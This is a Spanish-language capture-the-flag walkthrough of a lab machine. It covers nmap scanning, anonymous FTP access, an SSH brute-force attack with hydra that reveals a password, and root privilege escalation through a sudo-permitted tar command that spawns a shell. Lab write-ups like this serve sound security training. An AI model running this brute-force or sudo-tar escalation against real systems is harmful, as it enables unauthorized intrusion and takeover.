Enumeración

Para empezar, hacemos un ping para ver si la máquina está activa.

ping -c 1 10.10.12.22

Ahora que sabemos que la máquina está activa, es hora de escanear con nmap.

sudo nmap -p- -sCV 10.10.12.22 -n -Pn --min-rate 5000 -oN Scan

Inicio de sesión anónimo FTP & Fuerza Bruta

En los resultados del escaneo indica que el servidor tiene el inicio de sesión anónimo habilitado. Podemos iniciar sesión con el usuario anonymous y la contraseña en blanco.

ftp 10.10.12.22

Hay dos archivos:

En task.txt tenemos el usuario lin que hizo la nota.

Y en locks.txt, una wordlist.

Con la wordlist y el usuario podemos hacer un ataque de fuerza bruta con hydra.

hydra -l lin -P locks.txt ssh://10.10.12.22

Hydra encontró los credenciales lin:RedDr4gonSynd1cat3.

ssh lin@10.10.12.22

Escalada de privilegios

Lo primero al ganar la shell es adaptarla para más comodidad.

export TERM=xterm
export SHELL=bash

La flag de usuario está en /home/lin/Desktop/.

Podemos mirar los permisos sudo para ver que podemos ejecutar con sudo.

sudo -l

Tenemos permisos sudo en el binario /bin/tar.

En GTFOBins hay un comando para explotarlo.

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Una vez lo ejecutamos obtenemos una shell con root.
